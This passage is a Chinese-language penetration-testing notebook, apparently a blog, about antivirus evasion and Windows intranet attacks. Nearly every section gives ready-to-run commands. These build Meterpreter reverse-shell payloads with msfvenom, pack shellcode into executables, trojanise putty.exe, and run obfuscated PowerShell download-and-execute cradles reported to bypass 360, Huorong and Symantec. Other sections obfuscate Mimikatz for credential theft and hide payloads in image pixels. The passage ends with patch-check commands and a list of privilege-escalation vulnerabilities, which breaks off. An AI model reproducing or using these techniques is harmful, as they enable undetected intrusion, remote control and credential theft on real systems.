title="pyinstaller加载py代码编译(*)"></a>pyinstaller加载py代码编译(*)</h4><pre><code>生成py格式payloadMSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe&gt;msfvenom -p windows/meterpreter/reverse_tcp LPORT=12138 LHOST=192.168.0.108 -e x86/shikata_ga_nai -i 11 -f py -o /var/www/html/1.py粘贴shellcode到shellcode+py.py中，在32位系统上安装python、py2exe、pyinstaller进入C:\Python27\Scripts目录使用命令把py打包为exe&gt;python pyinstaller-script.py --console --onefile shellcode.py会在目录下生成dist文件夹，exe文件就在里面</code></pre><p><img src="./img/60.png" alt="image"><br><img src="./img/61.png" alt="image"><br><img src="./img/62.png" alt="image"></p><h4 id="Py2exe打包exe"><a href="#Py2exe打包exe" class="headerlink" title="Py2exe打包exe"></a>Py2exe打包exe</h4><pre><code>生成raw格式payloadMSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe&gt;msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f raw -o /var/www/html/shell.py在32位系统上安装python、py2exe创建setup.py放置同一目录</code></pre><p><img src="./img/63.png" alt="image"></p><pre><code>from distutils.core import setupimport py2exesetup(name = &quot;Meter&quot;,description = &quot;Python-based App&quot;,version = &quot;1.0&quot;,console = [&quot;shell.py&quot;],options = &#123;&quot;py2exe&quot;:&#123;&quot;bundle_files&quot;:1,&quot;packages&quot;:&quot;ctypes&quot;,&quot;includes&quot;:&quot;base64,sys,socket,struct,time,code,platform,getpass,shutil&quot;,&#125;&#125;,zipfile = None)执行打包命令&gt;python setup.py py2exe会在当前目录生成dist文件夹，打包好的exe在里面</code></pre><p><img src="./img/64.png" alt="image"></p><h4 id="Base64编码-Pyinstaller打包"><a href="#Base64编码-Pyinstaller打包" class="headerlink" title="Base64编码+Pyinstaller打包"></a>Base64编码+Pyinstaller打包</h4><pre><code>MSF监听需设置自动迁移进程set autorunscript migrate -n explorer.exe&gt;msfvenom -p windows/meterpreter/reverse_tcp --encrypt base64 LHOST=192.168.0.108 LPORT=12138 -f c -o /var/www/html/1.cShellcode粘贴在shellcode+base64+c.py中&gt;python pyinstaller-script.py -F -w shellcode.py会在目录下生成dist文件夹，exe文件就在里面</code></pre><h4 id="加载器分离"><a href="#加载器分离" class="headerlink" title="加载器分离"></a>加载器分离</h4><h5 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h5><pre><code>生成c格式payload&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#39;\x00&#39; lhost=192.168.0.108 lport=12138 -f c -o /var/www/html/shell.c下载k8final</code></pre><p><img src="./img/65.png" alt="image"></p><pre><code>粘贴shellcode进去</code></pre><p><img src="./img/66.png" alt="image"></p><pre><code>使用https://github.com/k8gege/scrun</code></pre><p><img src="./img/67.png" alt="image"></p><pre><code>或&gt;python scrun.py xxx或编译ScRunHex.py为exe</code></pre><h5 id="Base64"><a href="#Base64" class="headerlink" title="Base64(*)"></a>Base64(*)</h5><pre><code>生成c格式payload&gt;msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#39;\x00&#39; lhost=192.168.0.108 lport=12138 -f c -o /var/www/html/shell.c下载k8final</code></pre><p><img src="./img/68.png" alt="image"></p><pre><code>粘贴shellcode进去</code></pre><p><img src="./img/69.png" alt="image"></p><pre><code>进行hex编码后，粘贴进去base64编码</code></pre><p><img src="./img/70.png" alt="image"></p><pre><code>看系统位数编译ScRunBase.py文件，使用pyinstaller打包为exe后执行https://gitee.com/RichChigga/scrun/blob/master/ScRunBase64.py&gt;python pyinstaller-script.py -F -w ScRunBase64.py</code></pre><p><img src="./img/71.png" alt="image"><br><img src="./img/72.png" alt="image"></p><h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><pre><code>白dll劫持Processmonitor查找程序加载的dll使用stud_pe加载dll进去或生成payload免杀好粘贴进去，查看目标上有什么软件，本地查找可劫持的dll,劫持好文件后传上去。</code></pre><p><img src="./img/73.png" alt="image"></p><h3 id="MSBuild"><a href="#MSBuild" class="headerlink" title="MSBuild"></a>MSBuild</h3><pre><code>链接https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=12138 -f csharp远程执行&gt;wmiexec.py &lt;USER&gt;:&#39;&lt;PASS&gt;&#39;@&lt;RHOST&gt; cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\&lt;attackerip&gt;\&lt;share&gt;\msbuild_nps.xml要设置自动迁移进程</code></pre><p><img src="./img/74.png" alt="image"></p><h3 id="GreatSCT"><a href="#GreatSCT" class="headerlink" title="GreatSCT"></a>GreatSCT</h3><pre><code>&gt;use Bypass&gt;list&gt;use regasm/meterpreter/rev_tcp.py&gt;msfconsole -r /usr/share/greatsct-output/handlers/payload.rc</code></pre><h3 id="Mshta"><a href="#Mshta" class="headerlink" title="Mshta"></a>Mshta</h3><pre><code>https://github.com/mdsecactivebreach/CACTUSTORCH/blob/master/CACTUSTORCH.hta生成&gt;msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f raw -o /var/www/html/1.bin&gt;cat 1.bin |base64 -w 0</code></pre><p><img src="./img/75.png" alt="image"></p><pre><code>编码后的内容复制到</code></pre><p><img src="./img/76.png" alt="image"></p><pre><code>执行&gt;mshta http://192.168.0.106:1222/1.hta360执行检测出来，静态动态无法检测、火绒无法检测</code></pre><h3 id="InstallUtil"><a href="#InstallUtil" class="headerlink" title="InstallUtil"></a>InstallUtil</h3><pre><code>内网文章中有介绍</code></pre><h3 id="Veil"><a href="#Veil" class="headerlink" title="Veil"></a>Veil</h3><pre><code>&gt;use 1选择evasion模块&gt;list查看可用payload&gt;use 7 选择c格式的payload&gt;set LHOST/LPORT设置回连IP和端口&gt;generate生成</code></pre><p><img src="./img/77.png" alt="image"></p><pre><code>直接生成的exe可能会被查杀，目前可过360，不能过火绒使用minGW-w64编译C文件&gt;gcc -o vel.exe veil.c -l ws2_32</code></pre><h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><pre><code>&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 lhost=192.168.0.108 lport=3333 RC4PASSWORD=123qwe!@# -f c</code></pre><h3 id="捆绑-1"><a href="#捆绑-1" class="headerlink" title="捆绑"></a>捆绑</h3><pre><code>&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -e x86/shikata_ga_nai -x PsExec64.exe  -i 15 -f exe -o /var/www/html/payload4.exe</code></pre><h3 id="Evasion模块"><a href="#Evasion模块" class="headerlink" title="Evasion模块"></a>Evasion模块</h3><pre><code>&gt;show evasion</code></pre><h3 id="Phantom-Evasion"><a href="#Phantom-Evasion" class="headerlink" title="Phantom-Evasion"></a>Phantom-Evasion</h3><p><img src="./img/78.png" alt="image"><br><img src="./img/79.png" alt="image"></p><h3 id="Shellter"><a href="#Shellter" class="headerlink" title="Shellter"></a>Shellter</h3><pre><code>仅支持32位程序&gt;apt install shellter指定一个exe文件</code></pre><p><img src="./img/80.png" alt="image"></p><pre><code>选择payload</code></pre><h3 id="the-backdoor-factory"><a href="#the-backdoor-factory" class="headerlink" title="the-backdoor-factory"></a>the-backdoor-factory</h3><pre><code>查看是否支持捆绑&gt;python backdoor.py -f /root/Desktop/putty.exe -S查看此文件支持哪些payload&gt;python backdoor.py -f /root/Desktop/putty.exe -s showreverse_shell_tcp_inline对应msfset payload windows/meterpreter/reverse_tcpmeterpreter_reverse_https_threaded应msfset payload windows/meterpreter/reverse_httpsiat_reverse_tcp_stager_threaded修复IATuser_supplied_shellcode_threaded自定义payload参数-s 指定payload-H 回连地址-P 回连端口-J 多代码裂缝注入&gt;python backdoor.py -f ~/putty.exe -s iat_reverse_tcp_stager_threaded -H 192.168.0.108 -P 12138 -J -o payload.exe后门生成在backdoored目录或生成payloadmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -e x86/shikata_ga_nai -i 5 -f raw -o shellcode.c自定义&gt;python backdoor.py -f /root/putty.exe -s user_supplied_shellcode_threaded -U /root/shellcode.c  -o payload2.exe</code></pre><h3 id="zirikatu"><a href="#zirikatu" class="headerlink" title="zirikatu"></a>zirikatu</h3><p><img src="./img/81.png" alt="image"></p><h3 id="hanzoInjection"><a href="#hanzoInjection" class="headerlink" title="hanzoInjection"></a>hanzoInjection</h3><pre><code>https://github.com/P0cL4bs/hanzoInjection生成&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.108 lport=12138 -f raw -o /var/www/html/1.bin&gt;HanzoInjection.exe -p 1.bin -o 1.cs编译1.cs属性-生成-允许不安全代码</code></pre><h2 id="PowerShell免杀"><a href="#PowerShell免杀" class="headerlink" title="PowerShell免杀"></a>PowerShell免杀</h2><h3 id="直接生成"><a href="#直接生成" class="headerlink" title="直接生成"></a>直接生成</h3><pre><code>&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 15 -b &#39;\x00&#39; lhost=192.168.0.108 lport=12138 -f psh -o /var/www/html/1.ps1执行&gt;powershell -ep bypass -noexit -file 1.ps1Powershell行为检测bypass&gt;powershell -noexit &quot;$c1=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2=&#39;123(&#39;&#39;http://192.168.0.108/1.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot;</code></pre><h3 id="Invoke-Shellcode加载"><a href="#Invoke-Shellcode加载" class="headerlink" title="Invoke-Shellcode加载"></a>Invoke-Shellcode加载</h3><pre><code>生成code&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f powershell -o /var/www/html/1.ps1目标执行&gt; powershell -ep bypass&gt; IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.108/ps/powersploit/CodeExecution/Invoke-Shellcode.ps1&#39;)&gt; IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.108/1.ps1&#39;)&gt; Invoke-Shellcode -Shellcode ($buf) -Force</code></pre><p><img src="./img/82.png" alt="image"><br><img src="./img/83.png" alt="image"></p><pre><code>防护软件没反应</code></pre><h3 id="Invoke-Obfuscation"><a href="#Invoke-Obfuscation" class="headerlink" title="Invoke-Obfuscation"></a>Invoke-Obfuscation</h3><pre><code>https://github.com/danielbohannon/Invoke-Obfuscation生成code&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f psh -o /var/www/html/1.ps1&gt;powershell -ep bypass&gt;Import-Module .\Invoke-Obfuscation.psd1&gt;Invoke-Obfuscation&gt;set scriptpath C:\Users\y\Desktop\1.ps1&gt;encoding&gt;3 指定编码方式&gt;out C:\Users\y\Desktop\ok.ps1 保存</code></pre><p><img src="./img/84.png" alt="image"><br><img src="./img/85.png" alt="image"></p><pre><code>执行&gt;powershell -ep bypass -noexit -file ok.ps1</code></pre><p><img src="./img/86.png" alt="image"><br><img src="./img/87.png" alt="image"><br><img src="./img/88.png" alt="image"></p><h3 id="Xencrypt"><a href="#Xencrypt" class="headerlink" title="Xencrypt"></a>Xencrypt</h3><pre><code>https://github.com/the-xentropy/xencrypt/blob/master/xencrypt.ps1&gt;Invoke-Xencrypt -InFile invoke-mimikatz.ps1 -OutFile xenmimi.ps1 -Iterations 100 递归分层躲避动态查杀</code></pre><p><img src="./img/89.png" alt="image"></p><pre><code>&gt;Invoke-Xencrypt -infile .\Invoke-Mimikatz.ps1 -outfile mimi.ps1</code></pre><p><img src="./img/90.png" alt="image"><br><img src="./img/91.png" alt="image"></p><h3 id="PyFuscation"><a href="#PyFuscation" class="headerlink" title="PyFuscation"></a>PyFuscation</h3><pre><code>https://github.com/CBHue/PyFuscation对函数，参数，变量进行混淆&gt;python3 PyFuscation.py -fvp --ps Invoke-Mimikatz.ps1</code></pre><p><img src="./img/92.png" alt="image"><br><img src="./img/93.png" alt="image"></p><h3 id="拆分-C编译"><a href="#拆分-C编译" class="headerlink" title="拆分+C编译"></a>拆分+C编译</h3><pre><code>#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123;system(&quot;powershell $c2=&#39;IEX (New-Object Net.WebClient).Downlo&#39;;$c3=&#39;adString(&#39;&#39;http://x.x.x.x/a&#39;&#39;)&#39;; $Text=$c2+$c3; IEX(-join $Text)&quot;);return 0;&#125;</code></pre><h3 id="行为检测"><a href="#行为检测" class="headerlink" title="行为检测"></a>行为检测</h3><pre><code>&gt;powershell.exe -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal -w Normal &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/mimikatz/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz&quot;</code></pre><h3 id="Out-EncryptedScript"><a href="#Out-EncryptedScript" class="headerlink" title="Out-EncryptedScript"></a>Out-EncryptedScript</h3><pre><code>http://192.168.0.108/ps/powersploit/ScriptModification/Out-EncryptedScript.ps1&gt;Out-EncryptedScript -ScriptPath .\Invoke-Mimikatz.ps1 -Password shabiisme -Salt 123456</code></pre><p><img src="./img/94.png" alt="image"><br><img src="./img/95.png" alt="image"></p><pre><code>PS &gt; IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.0.108/ps/powersploit/ScriptModification/Out-EncryptedScript.ps1&quot;)PS &gt; [String] $cmd = Get-Content .\evil.ps1PS &gt; Invoke-Expression $cmdPS &gt; $decrypted = de shabiisme 123456PS &gt; Invoke-Expression $decryptedPS &gt; Invoke-Mimikatz</code></pre><h3 id="cobalt-strike-powershell免杀"><a href="#cobalt-strike-powershell免杀" class="headerlink" title="cobalt strike powershell免杀"></a>cobalt strike powershell免杀</h3><pre><code>From: https://y4er.com/post/cobalt-strike-powershell-bypass/powershell&gt;$string = &#39;&#39;powershell&gt;$s = [Byte[]]$var_code = [System.Convert]::FromBase64String(&#39;[cs生成的shellcode]&#39;)powershell&gt;$s |foreach &#123; $string = $string + $_.ToString()+&#39;,&#39;&#125;powershell&gt;$string&gt;c:\1.txt修改ps脚本[Byte[]]$var_code = [Byte[]](payload)再混淆一下函数和变量绕过执行命令的拦截使用cs的参数欺骗beacon &gt; argue cmd.exe blablabla</code></pre><h3 id="分块免杀"><a href="#分块免杀" class="headerlink" title="分块免杀"></a>分块免杀</h3><pre><code>生成msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.0.108 LPORT=443 -f psh-net -o shity_shellcode.ps1</code></pre><p><img src="./img/700.png" alt="image"></p><pre><code>先来测试一下，把ps1文件的shellcode换成一段无害的字符串</code></pre><p><img src="./img/701.png" alt="image"><br><img src="./img/702.png" alt="image"></p><pre><code>结果发现还是被查杀了</code></pre><p><img src="./img/703.png" alt="image"></p><pre><code>这表明大多数检测来自PowerShell模板，而不是Shellcode本身。下面几种bypass方法1.将字符串分成几部分并创建中间变量；2.添加大量垃圾备注；3.添加一些垃圾指令，例如循环或睡眠指令（对于沙盒有用）。[DllImport(&quot;kernel32.dll&quot;)]变为[DllImport(&quot;ke&quot;+&quot;rne&quot;+&quot;l32.dll&quot;)] #可绕过赛门铁克$przdE.ReferencedAssemblies.AddRange(@(&quot;System.dll&quot;,[PsObject].Assembly.Location))变为$magic=&quot;Syst&quot;+&quot;em&quot;+&quot;.dll&quot;;$przdE.ReferencedAssemblies.AddRange(@($magic,[PsObject].Assembly.Location))分割shellcode$sc0=&lt;shellcode的第1部分&gt;; …$sc7=&lt;shellcode的第8部分&gt;; [Byte[]]$tcomplete_sc=[System.Convert]::FromBase64String($sc0+$sc1+…+$sc7)一些细节可参照https://raw.githubusercontent.com/kmkz/Pentesting/master/AV_Evasion/AV_Bypass.ps1我不太懂汇编语言，所以没有添加无害指令。这里直接使用一键生成的bash脚本，有时间的可以读读里面的命令https://github.com/darksh3llRU/tools/blob/master/psh-net_shellcode_fastchange.sh这个脚本是生成个hta的，脚本以1337个字符来分块</code></pre><p><img src="./img/704.png" alt="image"></p><pre><code>我测试的时候1337个字符会被赛门铁克查杀到，我这里修改成250个字符来分块</code></pre><p><img src="./img/705.png" alt="image"></p><pre><code>因为我没加汇编指令，中间这里直接按任意键跳过即可，懂的可以在开头添加一些指令，例如xor，inc，dec，add，sub，mov，nop等</code></pre><p><img src="./img/706.png" alt="image"></p><pre><code>执行完后会生成一些文件</code></pre><p><img src="./img/707.png" alt="image"></p><pre><code>我们只用final_pshnet_revhttps.ps1这个文件，打开修改一下</code></pre><p><img src="./img/708.png" alt="image"></p><pre><code>修改成</code></pre><p><img src="./img/709.png" alt="image"><br><img src="./img/710.png" alt="image"><br><img src="./img/711.png" alt="image"></p><h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><pre><code>目标机器装有ruby时生成&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f ruby粘贴到ruby中</code></pre><p><img src="./img/96.png" alt="image"></p><pre><code>执行&gt;ruby xx.ruby</code></pre><h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><pre><code>生成&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f c代码转换成0x格式，粘贴到go.txt中保存为go格式</code></pre><p><img src="./img/97.png" alt="image"></p><pre><code>安装golang环境在shellcode目录执行&gt;go build生成exe</code></pre><h3 id="加载器"><a href="#加载器" class="headerlink" title="加载器"></a>加载器</h3><h4 id="go-shellcode"><a href="#go-shellcode" class="headerlink" title="go-shellcode"></a>go-shellcode</h4><pre><code>https://github.com/brimstone/go-shellcode进入cmd/sc目录编译sc.exe&gt;go build</code></pre><p><img src="./img/98.png" alt="image"></p><pre><code>生成&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f hex -o shell.txt 加载器加载shellcode&gt;sc.exe shellcode</code></pre><p><img src="./img/99.png" alt="image"></p><h4 id="Gsl"><a href="#Gsl" class="headerlink" title="Gsl"></a>Gsl</h4><pre><code>https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/gsl-sc-loader.zip&gt;gsl -s SHELLCODE -hex msf生成hex格式&gt;gsl -f shell.raw本地加载raw格式文件&gt;gsl -f shell.hex -hex 本地加载hex格式文件&gt;gsl -u http://192.168.0.108/1.raw 远程加载&gt;gsl -u http://192.168.0.108/1.hex</code></pre><h1 id="内网-amp-域"><a href="#内网-amp-域" class="headerlink" title="内网&amp;域"></a>内网&amp;域</h1><h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><pre><code>查看版本$PSVersionTable</code></pre><h3 id="远程执行"><a href="#远程执行" class="headerlink" title="远程执行"></a>远程执行</h3><pre><code>&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;&#39;);Invoke-xxx&quot;</code></pre><p><img src="./img/100.png" alt="image"></p><h3 id="加载exe"><a href="#加载exe" class="headerlink" title="加载exe"></a>加载exe</h3><pre><code>msfvenom生成exe木马#msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f exe &gt; /var/www/html/1.exe  使用powersploit的Invoke-ReflectivePEInjection.ps1脚本#powershell.exe -w hidden -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/clymberps/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http://192.168.0.107/1.exe -ForceASLR&quot; </code></pre><h3 id="EXE2PS1"><a href="#EXE2PS1" class="headerlink" title="EXE2PS1"></a>EXE2PS1</h3><pre><code>http://192.168.0.107/ps/powersploit/CodeExecution/Convert-BinaryToString.ps1将exe转换为base64&gt;Import-Module .\Convert-BinaryToString.ps1&gt;Convert-BinaryToString -FilePath .\ms15051.exe</code></pre><p><img src="./img/101.png" alt="image"></p><pre><code>http://192.168.0.107/ps/powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1Invoke-ReflectivePEInjection.ps1文件头部添加Function MS15051&#123;&lt;#.SYNOPSIS    .EXAMPLEC:\PS&gt; MS15051 -Command &quot;whoami&quot;#&gt; [CmdletBinding()]    param(        [Parameter(Mandatory = $False)]        [string]        $Command  )$InputString = &quot;文件的base64编码&quot;$PEBytes = [System.Convert]::FromBase64String($InputString)文件尾部添加write-host (&quot;[+] Executing Command: &quot;+$Command)  -foregroundcolor &quot;Green&quot;Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Command write-host (&quot;[+] Done !&quot;)  -foregroundcolor &quot;Green&quot;&#125;</code></pre><p><img src="./img/102.png" alt="image"></p><pre><code>远程下载执行&gt;powershell -nop -w hidden -ep bypass &quot;IEX (New-Object System.Net.Webclient).DownloadString(&#39;http://192.168.0.107/ps/powersploit/CodeExecution/ms15051.ps1&#39;); MS15051 –Command \&quot;whoami\&quot;&quot;</code></pre><p><img src="./img/103.png" alt="image"></p><h3 id="绕过策略"><a href="#绕过策略" class="headerlink" title="绕过策略"></a>绕过策略</h3><pre><code>&gt;powershell Set-ExecutionPolicy Unrestricted需管理员权限，不受限执行&gt;powershell.exe -nop -exec bypass -c &quot;IEX(New-Object net.webclient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-xxx.ps1&#39;);invoke-xxx&quot;&gt;powershell -exec bypass -File ./a.ps1&amp;&gt;Import-Module xxx</code></pre><h4 id="Base64-1"><a href="#Base64-1" class="headerlink" title="Base64"></a>Base64</h4><pre><code>&gt;use exploit/multi/script/web_delivery|target=2(PSH)&amp;&gt;cat payload.txt | iconv --to-code UTF-16LE |base64&gt;powershell -ep bypass -enc base64code</code></pre><h4 id="写入bat绕过"><a href="#写入bat绕过" class="headerlink" title="写入bat绕过"></a>写入bat绕过</h4><pre><code>powershell -exec bypass -File ./a.ps1 将该命令保存为c.bat</code></pre><h4 id="拼接拆分字符串"><a href="#拼接拆分字符串" class="headerlink" title="拼接拆分字符串"></a>拼接拆分字符串</h4><pre><code>powershell.exe  &quot;$c1=&#39;powershell -c IEX&#39;; $c2=&#39;(New-Object Net.WebClient).Downlo&#39;; $c3=&#39;adString(&quot;http://192.168.197.192/a.ps1&quot;)&#39;; echo ($c1,$c2,$c3) &quot; 先将命令拆分为字符串，然后进行拼接。echo修改为IEX执行。powershell $c2=&#39;IEX (New-Object Net.WebClient).Downlo&#39;;$c3=&#39;adString(&#39;&#39;http://x.x.x.x/a&#39;&#39;)&#39;; $Text=$c2+$c3; IEX(-join $Text)</code></pre><h4 id="Replace替换函数"><a href="#Replace替换函数" class="headerlink" title="Replace替换函数"></a>Replace替换函数</h4><pre><code>powershell -noexit &quot;$c1=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2=&#39;123(&#39;&#39;http://192.168.0.108/1.ps1&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot; </code></pre><h4 id="HTTP字符拼接绕过"><a href="#HTTP字符拼接绕过" class="headerlink" title="HTTP字符拼接绕过"></a>HTTP字符拼接绕过</h4><pre><code>也可以对http字符进行绕过，同样可以bypasspowershell &quot;$a=&#39;IEX((new-object net.webclient).downloadstring(&quot;ht&#39;;$b=&#39;tp://192.168.197.192/a.ps1&quot;))&#39;;IEX ($a+$b)&quot;  </code></pre><h4 id="图片免杀"><a href="#图片免杀" class="headerlink" title="图片免杀"></a>图片免杀</h4><pre><code>通过图片免杀执行powershell的脚本Invoke-PSImage.ps1，主要把payload分散存到图片的像素中,最后到远端执行时,再重新遍历重组像素中的payload执行。https://github.com/peewpw/Invoke-PSImage1900*1200的图片x.jpg。C:\&gt;powershell PS C:\&gt; Import-Module .\Invoke-PSImage.ps1 PS C:\&gt; Invoke-PSImage -Script .\a.ps1 -Image .\x.jpg -Out .\reverse_shell.png -Web a.ps1是msf木马，-Out 生成reverse_shell.png图片，-Web 输出从web读取的命令。将reverse_shell.png移动至web目录，替换url地址。在powershell下执行即可。</code></pre><h4 id="加载shellcode"><a href="#加载shellcode" class="headerlink" title="加载shellcode"></a>加载shellcode</h4><pre><code>msfvenom生成脚本木马#msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.72.164 LPORT=4444 -f powershell -o /var/www/html/test  在windows靶机上运行一下命令PS &gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&quot;) PS &gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://192.168.72.164/test&quot;) Invoke-Shellcode -Shellcode $buf -Force  运行木马 使用Invoke-Shellcode.ps1脚本执行shellcode即可反弹meterpreter shell</code></pre><h4 id="加载dll"><a href="#加载dll" class="headerlink" title="加载dll"></a>加载dll</h4><pre><code>使用msfvenom 生成dll木马脚本&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.72.164 lport=4444 -f dll -o /var/www/html/test.dll 将生成的dll上传到目标的C盘。在靶机上执行以下命令PS &gt;IEX(New-Object Net.WebClient).DownloadString(&quot;http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-DllInjection.ps1&quot;) Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden  创建新的进程启动记事本，并设置为隐藏Invoke-DllInjection -ProcessID xxx -Dll c:\test.dll 使用notepad的PID  Msf#use exploit/multi/handler#set payload windows/x64/meterpreter/reverse_tcp#run</code></pre><h2 id="Windows安全标识符-SID"><a href="#Windows安全标识符-SID" class="headerlink" title="Windows安全标识符(SID)"></a>Windows安全标识符(SID)</h2><table><thead><tr><th>相对标识符</th><th>说明</th></tr></thead><tbody><tr><td>500</td><td>管理员</td></tr><tr><td>501</td><td>来宾</td></tr><tr><td>502</td><td>密钥分发中心服务的服务账户</td></tr><tr><td>512</td><td>域管理员</td></tr><tr><td>513</td><td>域用户</td></tr><tr><td>514</td><td>域来宾</td></tr><tr><td>515</td><td>域计算机</td></tr><tr><td>516</td><td>域控制器</td></tr><tr><td>544</td><td>内置管理员</td></tr><tr><td>519</td><td>企业管理员</td></tr></tbody></table><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="Impacket工具包"><a href="#Impacket工具包" class="headerlink" title="Impacket工具包"></a>Impacket工具包</h3><pre><code>https://github.com/maaaaz/impacket-examples-windowshttps://github.com/SecureAuthCorp/impacket#git clone https://github.com/CoreSecurity/impacket.git #cd impacket/ #python setup.py install</code></pre><h3 id="Windows-exploit-suggester"><a href="#Windows-exploit-suggester" class="headerlink" title="Windows-exploit-suggester"></a>Windows-exploit-suggester</h3><pre><code>#pip install xlrd --upgrade#./windows-exploit-suggester.py --update#./windows-exploit-suggester.py --database 20xx-xx-xx-mssb.xlsx --systeminfo systeminfo.txt</code></pre><h3 id="Wesng"><a href="#Wesng" class="headerlink" title="Wesng"></a>Wesng</h3><pre><code>https://github.com/bitsadmin/wesng&gt;systeminfo &gt;1.txt&gt;python wes.py 1.txt</code></pre><p><img src="./img/104.png" alt="image"></p><h3 id="Searchsploit"><a href="#Searchsploit" class="headerlink" title="Searchsploit"></a>Searchsploit</h3><pre><code>使用方法&gt;searchsploit 软件 版本查找常见补丁https://bugs.hacking8.com/tiquan/http://get-av.se7ensec.cn/index.phphttps://patchchecker.com/checkprivs/wmic查询补丁wmic qfe list full|findstr /i hotfixsysteminfo&gt;temp.txt&amp;(for %i in (KB2271195 KB2124261 KB2160329 KB2621440  KB2707511 KB2829361 KB2864063 KB3000061 KB3045171 KB3036220 KB3077657 KB3079904 KB3134228 KB3124280 KB3199135) do @type temp.txt|@find /i  &quot;%i&quot;|| @echo %i Not Installed!)&amp;del /f /q /a temp.txtMS17-017 [KB4013081] [GDI Palette Objects Local Privilege Escalation] (windows 7/8) CVE-2017-8464 [LNK Remote Code Execution Vulnerability] (windows 10/8.1/7/2016/2010/2008) CVE-2017-0213 [Windows COM Elevation of Privilege Vulnerability] (windows 10/8.1/7/2016/2010/2008) MS17-010 [KB4013389] [Windows Kernel Mode Drivers] (windows 7/2008/2003/XP) MS16-135 [KB3199135] [Windows Kernel Mode Drivers] (2016) MS16-111 [KB3186973] [kernel api] (Windows 10 10586 (32/64)/8.1) MS16-098 [KB3178466] [Kernel Driver] (Win 8.1) MS16-075 [KB3164038] [Hot Potato] (2003/2008/7/8/2012) MS16-034 [KB3143145] [Kernel Driver] (2008/7/8/10/2012) MS16-032 [KB3143141] [Secondary Logon Handle] (2008/7/8/10/2012) MS16-016 [KB3136041] [WebDAV] (2008/Vista/7) MS15-097 [KB3089656] [remote code execution] (win8.1/2012) MS15-076 [KB3067505] [RPC] (2003/2008/7/8/2012) MS15-077 [KB3077657] [ATM] (XP/Vista/Win7/Win8/2000/2003/2008/2012) MS15-061 [KB3057839] [Kernel Driver] (2003/2008/7/8/2012) MS15-051 [KB3057191] [Windows Kernel Mode Drivers] (2003/2008/7/8/2012) MS15-010 [KB3036220] [Kernel Driver] (2003/2008/7/8) MS15-015 [KB3031432] [Kernel Driver] (Win7/8/8.1/2012/RT/2012 